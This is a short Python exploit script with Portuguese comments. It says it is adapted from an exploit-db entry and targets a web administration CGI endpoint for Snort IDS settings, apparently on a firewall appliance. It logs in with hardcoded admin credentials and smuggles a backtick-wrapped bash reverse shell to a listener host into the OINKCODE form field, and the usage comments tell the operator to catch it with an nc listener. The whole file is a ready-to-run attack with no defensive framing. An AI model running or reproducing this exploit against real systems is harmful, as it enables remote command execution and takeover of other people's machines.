#!/usr/bin/python3 python3
#Código original: https://www.exploit-db.com/exploits/42149
# Utilização:
# Terminal 1> python3 exploit.py
# Terminal 2> nc -vnlp 443

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#Edite as informações abaixo ===================
revhost = '172.20.1.125'
revport = 443
url = 'https://172.16.1.155:444/cgi-bin/ids.cgi'
username = 'admin'
password = '1pF1@dm#2020'
#===============================================

payload = 'bash -i >& /dev/tcp/' + revhost + '/' + str(revport) + ' 0>&1'
evildata = {'ENABLE_SNORT_GREEN':'on','ENABLE_SNORT':'on','RULES':'registered','OINKCODE': '`id`','ACTION': 'Download new ruleset','ACTION2':'snort'}
headers = {'Accept-Encoding' : 'gzip, deflate, br','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)','Referer': url,'Upgrade-Insecure-Requests':'1'}

evildata["OINKCODE"] = '`' + payload + '`'
print ("[+] Enviando payload malicioso [+]")
req = requests.post(url,data=evildata,headers=headers,auth=(username,password),verify=False)
